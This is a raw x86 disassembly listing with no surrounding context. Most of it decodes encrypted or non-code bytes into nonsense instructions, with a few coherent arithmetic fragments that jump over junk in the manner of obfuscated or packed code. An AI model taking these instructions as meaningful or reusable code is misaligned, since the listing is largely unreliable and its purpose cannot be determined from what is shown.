  40ba91:	sbb    BYTE PTR [edx+0x6d],dh
  40ba94:	sub    ebp,ecx
  40ba96:	push   ds
  40ba97:	das    
  40ba98:	or     dl,BYTE PTR [eax]
  40ba9a:	in     eax,dx
  40ba9b:	in     al,0xbc
  40ba9d:	or     al,0x7c
  40ba9f:	push   ss
  40baa0:	sahf   
  40baa1:	adc    BYTE PTR [ebp-0x3baa7475],al
  40baa7:	mov    edi,DWORD PTR [ebp-0x4]
  40baaa:	xor    edi,eax
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	push   edx
  40bacd:	in     eax,dx
  40bace:	cmp    DWORD PTR [eax+0x7c7c8395],edi
  40bad4:	retf   0x7c79
  40bad7:	jl     0x40ba9d
  40bad9:	adc    ebx,DWORD PTR [ecx+ebx*8-0x14]
  40badd:	cli    
  40bade:	cmc    
  40badf:	dec    eax
  40bae0:	arpl   WORD PTR [ecx+0x504a7dfc],dx
  40bae6:	mov    edi,0xa97baac
  40baeb:	xchg   ecx,eax
  40baec:	iret   
  40baed:	mov    dl,0x24
  40baef:	(bad)  
  40baf0:	mov    ch,0x11
  40baf2:	jmp    0xef0a2020
  40baf7:	cdq    
  40baf8:	neg    ebp
  40bafa:	jno    0x40bac1
  40bafc:	cmp    BYTE PTR [ecx],dl
  40bafe:	lea    edx,[ebx+0xb]
  40bb01:	push   cs
  40bb02:	dec    edx
  40bb03:	dec    ebp
  40bb04:	sub    BYTE PTR [eax+0x6c],0xcd
  40bb08:	retf   0x6e46
  40bb0b:	jg     0x40bb34
  40bb0d:	or     ebp,DWORD PTR [esi]
  40bb0f:	inc    ebp
  40bb10:	sbb    al,0x19
  40bb12:	fstp   TBYTE PTR [ebx-0x6fbc824]
  40bb18:	ins    BYTE PTR es:[edi],dx
  40bb19:	fucomip st,st(5)
  40bb1b:	jl     0x40bb16
  40bb1d:	inc    ebp
  40bb1e:	sub    esi,esi
  40bb20:	xchg   ecx,eax
  40bb21:	jns    0x40bb4a
  40bb23:	fcom   QWORD PTR [eax-0x53]
  40bb26:	inc    edx
  40bb27:	inc    ebx
  40bb28:	ret    
  40bb29:	test   BYTE PTR [edx],ch
  40bb2b:	dec    esp
  40bb2c:	jnp    0x40bb2c
  40bb2e:	enter  0xc881,0x22
  40bb32:	(bad)  
  40bb33:	aas    
  40bb34:	int3   
  40bb35:	lods   al,BYTE PTR ds:[esi]
  40bb36:	outs   dx,DWORD PTR ds:[esi]
  40bb37:	mov    ah,0x8
  40bb39:	cmp    ecx,DWORD PTR [eax-0x46226d01]
  40bb3f:	pop    edi
  40bb40:	ret    
  40bb41:	or     eax,esi
  40bb43:	jbe    0x40bbbe
  40bb45:	sbb    BYTE PTR [eax],cl
  40bb47:	push   cs
  40bb48:	(bad)  
  40bb49:	out    dx,al
  40bb4a:	test   al,0x11
  40bb4c:	jle    0x40bbba
  40bb4e:	repnz cmp DWORD PTR [ebx-0x59399824],esp
  40bb55:	or     edx,DWORD PTR [eax]
  40bb57:	push   edi
  40bb58:	push   0x25
  40bb5a:	and    esi,0xffffffe4
  40bb5d:	mov    eax,ds:0x4deb98b
  40bb62:	shl    edx,1
  40bb64:	sbb    al,0x7c
  40bb66:	mov    bl,0x5e
  40bb68:	xchg   ecx,eax
  40bb69:	rcr    edi,0x0
  40bb6c:	push   0x57
  40bb6e:	mov    al,ds:0xc3893aaf
  40bb73:	mov    ds:0x2de91b5a,eax
  40bb78:	or     al,0x25
  40bb7a:	aam    0x8c
  40bb7c:	mov    esi,0xe96c528d
  40bb81:	outs   dx,BYTE PTR ds:[esi]
  40bb82:	fnstcw WORD PTR [ecx+ebx*1-0x5e]
  40bb86:	ror    DWORD PTR [ebx+0xc620aa],cl
  40bb8c:	dec    edx
  40bb8d:	sub    eax,0xc5465583
  40bb92:	adc    eax,0xaac47b75
  40bb97:	rcl    esp,1
  40bb99:	add    al,bl
  40bb9b:	push   ebx
  40bb9c:	test   eax,0x34678858
  40bba1:	jg     0x40bb9f
  40bba3:	retf   
  40bba4:	mov    al,0xeb
  40bba6:	stc    
  40bba7:	mov    ecx,DWORD PTR [edi-0x6a]
  40bbaa:	push   0xf0d6cdb1
  40bbaf:	xchg   ecx,eax
  40bbb0:	jae    0x40bb64
  40bbb2:	into   
  40bbb3:	fwait
  40bbb4:	mov    dh,BYTE PTR [eax]
  40bbb6:	rcl    BYTE PTR [esi+0x6a],cl
  40bbb9:	inc    ebx
  40bbba:	lods   al,BYTE PTR ds:[esi]
  40bbbb:	shr    dh,cl
  40bbbd:	iret   
  40bbbe:	dec    edx
  40bbbf:	scas   al,BYTE PTR es:[edi]
  40bbc0:	into   
  40bbc1:	in     eax,0xb0
  40bbc3:	sar    BYTE PTR [ecx],cl
  40bbc5:	shl    DWORD PTR [edx],cl
  40bbc7:	ins    BYTE PTR es:[edi],dx
  40bbc8:	mov    ecx,DWORD PTR fs:0x6adaea61
  40bbcf:	inc    eax
  40bbd0:	jecxz  0x40bbda
  40bbd2:	retf   0xda51
  40bbd5:	cli    
  40bbd6:	pop    eax
  40bbd7:	daa    
  40bbd8:	inc    esi
  40bbd9:	in     al,0xac
  40bbdb:	ss inc esp
  40bbdd:	jp     0x40bbe4
  40bbdf:	cli    
  40bbe0:	jae    0x40bc4f
  40bbe2:	jne    0x40bb94
  40bbe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe5:	fiadd  WORD PTR [edx+0x75]
  40bbe8:	mov    cl,0xdd
  40bbea:	or     al,0xea
  40bbec:	adc    DWORD PTR [ebx+0x4b24b22e],ebx
  40bbf2:	dec    edi
  40bbf3:	fstp   DWORD PTR [ebx]
  40bbf5:	sub    eax,0xcb5ebc4
  40bbfa:	ss mov bl,0x82
  40bbfd:	xchg   esp,eax
  40bbfe:	neg    BYTE PTR [ebp+0x1af6ebae]
  40bc04:	add    esi,DWORD PTR [esi+ebp*2+0x31637cea]
  40bc0b:	sub    bl,bh
  40bc0d:	xor    bl,dh
  40bc0f:	dec    edi
  40bc10:	fs out dx,al
  40bc12:	popf   
  40bc13:	pop    esi
  40bc14:	ds int3 
  40bc16:	pushf  
  40bc17:	sub    DWORD PTR [ebx+ecx*8],edx
  40bc1a:	cs int 0x70
  40bc1d:	mov    eax,ds:0xc2a63c5c
  40bc22:	cli    
  40bc23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc24:	in     eax,0xa7
  40bc26:	mov    al,al
  40bc28:	lods   al,BYTE PTR ds:[esi]
  40bc29:	lods   al,BYTE PTR ds:[esi]
  40bc2a:	dec    ebp
  40bc2b:	hlt    
  40bc2c:	idiv   DWORD PTR [eax-0x3b]
  40bc2f:	jbe    0x40bc18
  40bc31:	inc    ebx
  40bc32:	xchg   esp,eax
  40bc33:	cmc    
  40bc34:	ret    0x7cb9
  40bc37:	jns    0x40bc39
  40bc39:	in     al,dx
  40bc3a:	loope  0x40bbdf
  40bc3c:	fiadd  WORD PTR [eax-0x2b]
  40bc3f:	or     DWORD PTR [ecx],esi
  40bc41:	(bad)  
  40bc42:	out    0x98,eax
  40bc44:	into   
  40bc45:	loope  0x40bc84
  40bc47:	prefetch BYTE PTR [ecx+0x21a38910]
  40bc4e:	push   esp
  40bc4f:	call   0x968f93b6
  40bc54:	scas   eax,DWORD PTR es:[edi]
  40bc55:	cmp    eax,0xbb27890a
  40bc5a:	xor    eax,0xd441014e
  40bc5f:	out    0x27,al
  40bc61:	and    DWORD PTR [ebp+0x72888f84],edi
  40bc67:	gs imul ebx
  40bc6a:	aaa    
  40bc6b:	(bad)  
  40bc6c:	xor    BYTE PTR [edi-0x6452c88b],dh
  40bc72:	cmp    ebx,DWORD PTR [ecx]
  40bc74:	retf   0xaa88
  40bc77:	out    0x63,eax
  40bc79:	test   dh,bh
  40bc7b:	add    BYTE PTR [esi+0x6b],0x7e
  40bc7f:	not    DWORD PTR [eax+0x4d7d9abf]
  40bc85:	inc    ecx
  40bc86:	in     eax,0x6b
  40bc88:	jmp    0x40bc89
  40bc8a:	add    al,0x8e
  40bc8c:	cs sub dh,dl
  40bc8f:	jmp    0x5ba3:0xeca457ba
  40bc96:	jmp    0xb4e8f55e
  40bc9b:	div    al
  40bc9d:	ret    0x68a7
  40bca0:	xchg   esi,eax
  40bca1:	mov    esi,0x61306c26
  40bca6:	call   0xc8e3:0x4885a052
  40bcad:	mov    bh,0xa0
  40bcaf:	mov    esi,0x22d079cb
  40bcb4:	addr16 mov ebp,0x2fd63cd5
  40bcba:	or     dh,BYTE PTR [edi+0x728bcf03]
  40bcc0:	pop    ebx
  40bcc1:	gs mov cl,0x50
  40bcc4:	or     eax,0x9d47f1bc
  40bcc9:	sub    ebp,DWORD PTR [ebx]
  40bccb:	mov    bh,BYTE PTR [ecx+0x1694b5a]
  40bcd1:	push   ebx
  40bcd2:	and    bl,al
  40bcd4:	sbb    edx,DWORD PTR [ebp-0x78]
  40bcd7:	push   ecx
  40bcd8:	add    al,0x2a
  40bcda:	popa   
  40bcdb:	sub    eax,0x3ca45e12
  40bce0:	iret   
  40bce1:	add    cl,BYTE PTR [esi+0x48e2c623]
  40bce7:	inc    esi
  40bce8:	or     dl,ah
  40bcea:	push   ecx
  40bceb:	mov    ch,BYTE PTR [edi-0x7ab57c28]
  40bcf1:	in     al,dx
  40bcf2:	dec    edi
  40bcf3:	jmp    0x40bcb7
  40bcf5:	xchg   ebx,eax
  40bcf6:	pop    ss
  40bcf7:	and    al,0x3a
  40bcf9:	mov    bh,0xe3
  40bcfb:	push   ss
  40bcfc:	xlat   BYTE PTR ds:[ebx]
  40bcfd:	add    ch,BYTE PTR [ebx+0x6c2e9111]
  40bd03:	pusha  
  40bd04:	dec    eax
  40bd05:	rcr    DWORD PTR [edx+ecx*1+0x743454ae],1
  40bd0c:	cmp    BYTE PTR [ebx+0x4cd3c1e0],ah
  40bd12:	or     al,0x51
  40bd14:	and    DWORD PTR [ecx+0x6f67bc6a],ebp
  40bd1a:	hlt    
  40bd1b:	inc    ebp
  40bd1c:	ror    DWORD PTR [edi-0x67b25d2d],cl
  40bd22:	ins    BYTE PTR es:[edi],dx
  40bd23:	add    eax,DWORD PTR ds:[eax+0x16]
  40bd27:	inc    ebx
  40bd28:	add    ch,BYTE PTR [eax-0x398f7472]
  40bd2e:	ret    0x5564
  40bd31:	vpaddd xmm6,xmm1,xmm1
  40bd35:	inc    edx
  40bd36:	popa   
  40bd37:	arpl   WORD PTR [eax-0x4b],cx
  40bd3a:	mov    esp,0xc8b36b37
  40bd3f:	ror    bl,0xc7
  40bd42:	and    edx,DWORD PTR [ecx]
  40bd44:	ss sti 
  40bd46:	clc    
  40bd47:	in     eax,0xf1
  40bd49:	rcl    bl,0x9f
  40bd4c:	ret    
  40bd4d:	sbb    dh,BYTE PTR [edi+0x27fc3d0f]
  40bd53:	cmp    al,bl
  40bd55:	repz scas eax,DWORD PTR es:[edi]
  40bd57:	cld    
  40bd58:	jnp    0x40bd59
  40bd5a:	(bad)  
  40bd5c:	push   edi
  40bd5d:	and    esp,DWORD PTR [ebx-0x61219a6e]
  40bd63:	sub    al,0x83
  40bd65:	imul   esp,DWORD PTR [ecx-0x1f],0x214941d
  40bd6c:	int    0xd5
  40bd6e:	shl    ebp,1
  40bd70:	outs   dx,BYTE PTR ds:[esi]
  40bd71:	daa    
  40bd72:	cld    
  40bd73:	jo     0x40bd4b
  40bd75:	push   edi
  40bd76:	mov    cl,BYTE PTR [eax-0x7b]
  40bd79:	test   dh,bl
  40bd7b:	popf   
  40bd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd7d:	and    DWORD PTR [esi+0x38],esp
  40bd80:	xor    al,0xe4
  40bd82:	or     dl,BYTE PTR [edx]
  40bd84:	or     ebx,DWORD PTR [eax+ebx*4]
  40bd87:	xchg   BYTE PTR [ecx-0x1],dh
  40bd8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd8b:	jecxz  0x40bdd6
  40bd8d:	sub    bh,BYTE PTR [ecx-0x6f1565f8]
  40bd93:	or     BYTE PTR [edx+eax*1-0x218f63a2],dl
  40bd9a:	add    al,0x6c
  40bd9c:	cmp    al,0x68
  40bd9e:	sub    BYTE PTR [edx+esi*8],ah
  40bda1:	push   ss
  40bda2:	retf   0x738
  40bda5:	add    BYTE PTR [ebp+0x2c],bl
  40bda8:	push   ss
  40bda9:	(bad)  [ebx+0x58]
  40bdac:	imul   edx,eax,0xb8029abb
  40bdb2:	loope  0x40bddc
  40bdb4:	add    edx,0xffee6e52
  40bdba:	pop    ds
  40bdbb:	dec    edi
  40bdbc:	in     al,dx
  40bdbd:	popa   
  40bdbe:	dec    edi
  40bdbf:	pop    eax
  40bdc0:	mov    DWORD PTR [edi],ebp
  40bdc2:	leave  
  40bdc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc4:	or     BYTE PTR [edx],al
  40bdc6:	jmp    0x110f13de
  40bdcb:	ror    BYTE PTR [edx],cl
  40bdcd:	inc    ebx
  40bdce:	shl    DWORD PTR [esi+eiz*8+0x3ea6853d],1
  40bdd5:	xor    DWORD PTR [esi+0x59],ebp
  40bdd8:	loopne 0x40be33
  40bdda:	nop
  40bddb:	mov    esi,0x5940496d
  40bde0:	daa    
  40bde1:	jecxz  0x40bd96
  40bde3:	scas   al,BYTE PTR es:[edi]
  40bde4:	jecxz  0x40be39
  40bde6:	inc    esi
  40bde7:	push   ss
  40bde8:	xchg   DWORD PTR [edi+0x36],ebx
  40bdeb:	jo     0x40be09
  40bded:	js     0x40bdbc
  40bdef:	cmp    esp,DWORD PTR [edi+0x76]
  40bdf2:	mov    eax,0xd3d1b2e4
  40bdf7:	jb     0x40be25
  40bdf9:	cwde   
  40bdfa:	ret    
  40bdfb:	outs   dx,DWORD PTR ds:[esi]
  40bdfc:	cmp    DWORD PTR [ebx+edi*2-0xa],ebp
  40be00:	out    0xb8,eax
  40be02:	pop    ebp
  40be03:	sub    eax,0x1bcd5eb7
  40be08:	jge    0x40be5d
  40be0a:	push   ecx
  40be0b:	inc    esi
  40be0c:	rcl    DWORD PTR [edi],cl
  40be0e:	aam    0x97
  40be10:	retf   
  40be11:	jo     0x40be82
  40be13:	loop   0x40bdc1
  40be15:	lods   eax,DWORD PTR ds:[esi]
  40be16:	in     al,0x85
  40be18:	adc    DWORD PTR [ebp+0x7e0be682],eax
  40be1e:	or     eax,0x53622311
  40be23:	add    ecx,DWORD PTR [eax+0x32]
  40be26:	cmp    al,0xda
  40be28:	mov    dl,0xf5
  40be2a:	adc    DWORD PTR [edi+eiz*8],0xdc55890b
  40be31:	mov    edx,DWORD PTR [ebp-0x8]
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	(bad)  
  40be66:	loop   0x40be1e
  40be68:	dec    eax
  40be69:	arpl   WORD PTR [esp+edi*2+0x7c79ca7c],cx
  40be70:	jl     0x40be73
  40be72:	mov    esp,0xcd8d7e98
  40be77:	div    DWORD PTR [ecx-0x3c3f87f7]
  40be7d:	popf   
  40be7e:	mov    ecx,0x3fc264f1
  40be83:	add    DWORD PTR [ebx-0x4ee27361],edi
  40be89:	and    BYTE PTR [eax-0x52],ch
  40be8c:	inc    ebx
  40be8d:	div    BYTE PTR [ebp+0x5c]
  40be90:	ror    DWORD PTR [eax+0x49],1
  40be93:	imul   BYTE PTR [ecx]
  40be95:	cmc    
  40be96:	sbb    DWORD PTR [edx+0x31],ecx
  40be99:	dec    ax
  40be9b:	jge    0x40be99
  40be9d:	gs pop ebp
  40be9f:	pop    edi
  40bea0:	jb     0x40bef9
  40bea2:	daa    
  40bea3:	mov    esi,0x1d6155de
  40bea8:	push   0x1de6cff4
  40bead:	int3   
  40beae:	xor    ecx,DWORD PTR [esi+0x58]
  40beb1:	xor    bl,BYTE PTR [ebx+edi*1+0x2fc26bb6]
  40beb8:	(bad)  
  40beb9:	push   ds
  40beba:	out    0x87,al
  40bebc:	loope  0x40beaa
  40bebe:	or     DWORD PTR [edx],esp
  40bec0:	sub    BYTE PTR [ebp-0x42],ah
  40bec3:	mov    edx,0xcc1f7704
  40bec8:	pop    ds
  40bec9:	pusha  
  40beca:	pop    esi
  40becb:	out    dx,al
  40becc:	sar    ebp,0x28
  40becf:	sti    
  40bed0:	out    dx,eax
  40bed1:	mov    dh,0xa1
  40bed3:	sbb    eax,0x8702ed43
  40bed8:	out    dx,eax
  40bed9:	sahf   
  40beda:	test   DWORD PTR [eax],esp
  40bedc:	outs   dx,DWORD PTR ds:[esi]
  40bedd:	(bad)  
  40bede:	jmp    0xb4d1:0x17377310
  40bee5:	xchg   esp,eax
  40bee6:	adc    eax,DWORD PTR [ecx+0x7be93428]
  40beec:	outs   dx,DWORD PTR ds:[esi]
  40beed:	jns    0x40bf59
  40beef:	retf   
  40bef0:	test   al,0x5
  40bef2:	cli    
  40bef3:	and    ebx,esp
  40bef5:	loopne 0x40be86
  40bef7:	cmp    BYTE PTR [ebp-0x519bff8b],0xe3
  40befe:	add    BYTE PTR [ebx+0x70],dl
  40bf01:	(bad)  
  40bf02:	out    dx,eax
  40bf03:	mov    esp,0x7752a589
  40bf08:	adc    BYTE PTR [eax-0x6dfa3c02],ah
  40bf0e:	in     eax,dx
  40bf0f:	mov    edx,0x63e1f999
  40bf14:	pop    edi
  40bf15:	xor    al,0x90
  40bf17:	loop   0x40bee0
  40bf19:	dec    ecx
  40bf1a:	jo     0x40bebb
  40bf1c:	pop    es
  40bf1d:	sti    
  40bf1e:	xor    al,0x65
  40bf20:	fisubr DWORD PTR [ebx+0x23818c34]
  40bf26:	aam    0x74
  40bf28:	dec    ecx
  40bf29:	or     ecx,ebx
  40bf2b:	add    dl,BYTE PTR ds:0x5d7c840a
  40bf31:	add    eax,0x390db939
  40bf36:	or     ah,BYTE PTR [eax+0x1e]
  40bf39:	sti    
  40bf3a:	mov    dh,0xe
  40bf3c:	adc    dl,BYTE PTR [ebx]
  40bf3e:	adc    eax,0x96b1d9bc
  40bf43:	int3   
  40bf44:	pop    ebx
  40bf45:	xchg   edi,eax
  40bf46:	mov    al,ds:0x2ecd29c3
  40bf4b:	or     al,0x92
  40bf4d:	sub    ebp,DWORD PTR [ebx]
  40bf4f:	fstp   st(4)
  40bf51:	sbb    al,0xc7
  40bf53:	xchg   ecx,eax
  40bf54:	retf   0x8896
  40bf57:	cmp    DWORD PTR es:[edx],ebp
  40bf5a:	mov    al,ds:0xe37a965f
  40bf5f:	xor    al,0xea
  40bf61:	and    bh,BYTE PTR [ecx+eax*4]
  40bf64:	xor    BYTE PTR [eax],cl
  40bf66:	outs   dx,BYTE PTR ds:[esi]
  40bf67:	lods   eax,DWORD PTR ds:[esi]
  40bf68:	xchg   DWORD PTR [edx+0x49286ab2],esp
  40bf6e:	in     eax,dx
  40bf6f:	stos   DWORD PTR es:[edi],eax
  40bf70:	inc    eax
  40bf71:	sbb    BYTE PTR [esi],dl
  40bf73:	rcr    esi,0xd3
  40bf76:	aam    0xb9
  40bf78:	ret    0xba89
  40bf7b:	cmp    eax,0x265f3607
  40bf80:	mov    ah,0x84
  40bf82:	push   esi
  40bf83:	jb     0x40bf5b
  40bf85:	pop    ecx
  40bf86:	es gs inc eax
  40bf89:	ret    
  40bf8a:	mov    dh,0xdb
  40bf8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf8d:	fwait
  40bf8e:	shr    dl,0x70
  40bf91:	outs   dx,BYTE PTR ds:[esi]
  40bf92:	sbb    edi,0xffffffe2
  40bf95:	add    al,BYTE PTR [ebp-0x10c264e2]
  40bf9b:	inc    esi
  40bf9c:	jg     0x40bfd5
  40bf9e:	cmp    BYTE PTR [ecx-0x7a],cl
  40bfa1:	into   
  40bfa2:	les    ebx,FWORD PTR [ebp+0x5888a085]
  40bfa8:	es jno 0x40bf53
  40bfab:	loop   0x40c026
  40bfad:	pushf  
  40bfae:	fucomi st,st(1)
  40bfb0:	cld    
  40bfb1:	cmc    
  40bfb2:	mov    ecx,0xba40463d
  40bfb7:	inc    ebx
  40bfb8:	(bad)  
  40bfb9:	nop
  40bfba:	iret   
  40bfbb:	jae    0x40bf3f
  40bfbd:	(bad)  
  40bfbe:	leave  
  40bfbf:	out    0x99,al
  40bfc1:	lock and ebx,DWORD PTR [esi]
  40bfc4:	ror    dl,1
  40bfc6:	ins    BYTE PTR es:[edi],dx
  40bfc7:	jmp    0x40bfdf
  40bfc9:	ins    BYTE PTR es:[edi],dx
  40bfca:	mov    dh,0xe4
  40bfcc:	(bad)  
  40bfce:	in     al,0x67
  40bfd0:	jmp    0x5f245ae7
  40bfd5:	fldenv [esp+eiz*4-0xf]
  40bfd9:	and    ebp,DWORD PTR [ebp-0x5b25fc27]
  40bfdf:	dec    ecx
  40bfe0:	add    ah,BYTE PTR [edi-0x10]
  40bfe3:	lods   al,BYTE PTR ds:[esi]
  40bfe4:	iret   
  40bfe5:	dec    edi
  40bfe6:	jmp    0x40c03e
  40bfe8:	in     eax,0x15
  40bfea:	push   es
  40bfeb:	inc    ecx
  40bfec:	minps  xmm6,XMMWORD PTR [ebp-0x35cc4e36]
  40bff3:	mov    cl,0x9f
  40bff5:	push   0x6e
  40bff7:	mov    gs,WORD PTR [ecx-0x7f]
  40bffa:	iret   
  40bffb:	in     al,0xca
  40bffd:	add    eax,0xba9b4248
  40c002:	pop    edi
  40c003:	retf   0xa993
  40c006:	add    al,0x50
  40c008:	call   0x6c71:0x4bfbe6e2
  40c00f:	add    DWORD PTR [esp+edx*4-0x65df21a9],esi
  40c016:	(bad)  
  40c017:	stos   DWORD PTR es:[edi],eax
  40c018:	jp     0x40bff6
  40c01a:	push   0x6c71cb0
  40c01f:	ss aad 0x53
  40c022:	sub    eax,0x99ac2aaa
  40c027:	push   0x4569291d
  40c02c:	call   0x438e2b77
  40c031:	xchg   esp,eax
  40c032:	pushf  
  40c033:	imul   esi,edi,0x70
  40c036:	mov    edx,0x80ba909f
  40c03b:	or     bl,BYTE PTR [eax-0x56579387]
  40c041:	sbb    ecx,ebp
  40c043:	cmp    BYTE PTR [edi],al
  40c045:	outs   dx,DWORD PTR ds:[esi]
  40c046:	gs dec ebp
  40c048:	sub    cl,BYTE PTR [edi+0x78]
  40c04b:	fist   WORD PTR [edx-0x1c]
  40c04e:	iret   
  40c04f:	jp     0x40c0a4
  40c051:	js     0x40c011
  40c053:	test   al,0xb9
  40c055:	pop    ebp
  40c056:	jle    0x40c052
  40c058:	imul   edi,edx,0xffffffb3
  40c05b:	push   0xfffffff1
  40c05d:	dec    ebx
  40c05e:	and    BYTE PTR [esi],ch
  40c060:	push   esi
  40c061:	sbb    al,0x5d
  40c063:	sub    BYTE PTR [ebx+0x4bebb0ff],al
  40c069:	fwait
  40c06a:	jo     0x40c03f
  40c06c:	int    0xbd
  40c06e:	leave  
  40c06f:	fmul   QWORD PTR [edi+0x5b]
  40c072:	movups XMMWORD PTR [ecx],xmm0
  40c075:	out    0x65,eax
  40c077:	sar    BYTE PTR [edi],1
  40c079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c07a:	sbb    DWORD PTR [ecx-0xbf7f954],edx
  40c080:	shr    DWORD PTR [eax+ebx*1+0x14dd9a3d],1
  40c087:	sub    BYTE PTR [eax+0x39],al
  40c08a:	xor    dl,bh
  40c08c:	out    0xdb,eax
  40c08e:	(bad)  
  40c08f:	pop    ds
  40c090:	mov    esi,esi
  40c092:	std    
  40c093:	scas   al,BYTE PTR es:[edi]
  40c094:	dec    eax
  40c095:	js     0x40c0cb
  40c097:	pop    ss
  40c098:	push   esp
  40c099:	(bad)  
  40c09a:	cmp    al,0x9e
  40c09c:	das    
  40c09d:	sbb    dl,BYTE PTR [ebx]
  40c09f:	pop    ss
  40c0a0:	sub    bh,0x9f
  40c0a3:	sub    eax,0xa5e269ec
  40c0a8:	xchg   esp,eax
  40c0a9:	push   0xd123f7a4
  40c0ae:	packuswb mm1,QWORD PTR [ebx]
  40c0b1:	je     0x40c047
  40c0b3:	push   ss
  40c0b4:	cmp    al,0x70
  40c0b6:	xchg   ebp,eax
  40c0b7:	sahf   
  40c0b8:	sbb    ch,BYTE PTR [ecx+0x9b79c59]
  40c0be:	gs ds jl 0x40c0a5
  40c0c2:	jae    0x40c048
  40c0c4:	imul   ecx,DWORD PTR [ecx+0x60512805],0xfffffff3
  40c0cb:	push   ebx
  40c0cc:	and    DWORD PTR [ebp+0x7],eax
  40c0cf:	mov    esp,0xba087d16
  40c0d4:	cwde   
  40c0d5:	xchg   ebp,eax
  40c0d6:	mov    cl,0x8b
  40c0d8:	sbb    ah,BYTE PTR [ebx]
  40c0da:	pop    esp
  40c0db:	inc    edx
  40c0dc:	fisub  WORD PTR [esi-0x236ef9a0]
  40c0e2:	adc    BYTE PTR [esi+ecx*8],cl
  40c0e5:	push   edx
  40c0e6:	(bad)  
  40c0e7:	and    edi,DWORD PTR [edi+0x4327ac27]
  40c0ed:	aas    
  40c0ee:	cmp    ecx,edx
  40c0f0:	sbb    al,0x97
  40c0f2:	test   BYTE PTR [ebp+0x17e1189b],ah
  40c0f8:	aas    
  40c0f9:	push   es
  40c0fa:	outs   dx,DWORD PTR ds:[esi]
  40c0fb:	int    0x71
  40c0fd:	push   esp
  40c0fe:	(bad)  
  40c0ff:	frstor [edi-0x3e301831]
  40c105:	cwde   
  40c106:	inc    ebp
  40c107:	pop    edx
  40c108:	fstp   TBYTE PTR [ebx]
  40c10a:	lods   eax,DWORD PTR cs:[esi]
  40c10c:	pop    ebp
  40c10d:	ins    BYTE PTR es:[edi],dx
  40c10e:	cmp    al,0x23
  40c110:	xchg   edx,eax
  40c111:	arpl   bx,dx
  40c113:	sub    eax,DWORD PTR [ecx+0xf]
  40c116:	sub    eax,0x8bdf773f
  40c11b:	fwait
  40c11c:	add    DWORD PTR [eax-0x44],0x5f496e43
  40c123:	fsubr  DWORD PTR [esi]
  40c125:	sub    BYTE PTR [edx+0x78],0x8d
  40c129:	hlt    
  40c12a:	jne    0x40c0d4
  40c12c:	sbb    al,0xa
  40c12e:	mov    edi,0xf83082b0
  40c133:	lods   al,BYTE PTR ds:[esi]
  40c134:	aaa    
  40c135:	cdq    
  40c136:	fisttp WORD PTR [eax+0x78678f56]
  40c13c:	sub    DWORD PTR [ebp+0x629a8e7b],esp
  40c142:	into   
  40c143:	or     BYTE PTR [eax+0x38],cl
  40c146:	mov    ds:0xf882aa60,al
  40c14b:	bound  ebx,QWORD PTR [esi]
  40c14d:	lock push 0xa21f3869
  40c153:	adc    DWORD PTR [esi-0x5e434d3f],esi
  40c159:	rcr    DWORD PTR [edi],0xa1
  40c15c:	cmp    al,0x3
  40c15e:	xchg   DWORD PTR [edx-0x3],eax
  40c161:	mov    edi,0xadefdb89
  40c166:	jo     0x40c141
  40c168:	idiv   BYTE PTR [ebx+0x5]
  40c16b:	daa    
  40c16c:	dec    esp
  40c16d:	sbb    ecx,DWORD PTR [ecx-0x24f642eb]
  40c173:	loop   0x40c1b2
  40c175:	xchg   edi,eax
  40c176:	pop    ebx
  40c177:	adc    al,0x7e
  40c179:	push   ebx
  40c17a:	adc    eax,0x78f8e2d8
  40c17f:	fsubr  QWORD PTR [edi-0x3ab084e]
  40c185:	inc    ebx
  40c186:	sub    eax,0xc6b9407a
  40c18b:	retf   
  40c18c:	aam    0x22
  40c18e:	push   0x22425137
  40c193:	ins    DWORD PTR es:[di],dx
  40c195:	repnz mov al,0x9a
  40c198:	clc    
  40c199:	inc    esp
  40c19a:	sub    bl,BYTE PTR [edi+0x52a83a9a]
  40c1a0:	call   0x57e811bb
  40c1a5:	retf   0x1612
  40c1a8:	adc    DWORD PTR [eax+0x7c],esi
  40c1ab:	jae    0x40c1d2
  40c1ad:	mov    ds,WORD PTR [eax+0x15a36eba]
  40c1b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1b4:	inc    edx
  40c1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1b6:	xchg   ebx,eax
  40c1b7:	mov    eax,DWORD PTR [edx+eax*1+0x18309a10]
  40c1be:	rcr    BYTE PTR [ebx-0x51],cl
  40c1c1:	or     eax,0xb336071c
  40c1c6:	push   eax
  40c1c7:	add    edx,ecx
  40c1c9:	jmp    0x40cc8f
  40c1ce:	jmp    0x40c541
  40c1d3:	push   ss
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	repz pop ss
  40c1e1:	xor    ebx,DWORD PTR [esi+0x39]
  40c1e4:	mov    BYTE PTR [esp+edi*2-0x36],bh
  40c1e8:	jns    0x40c266
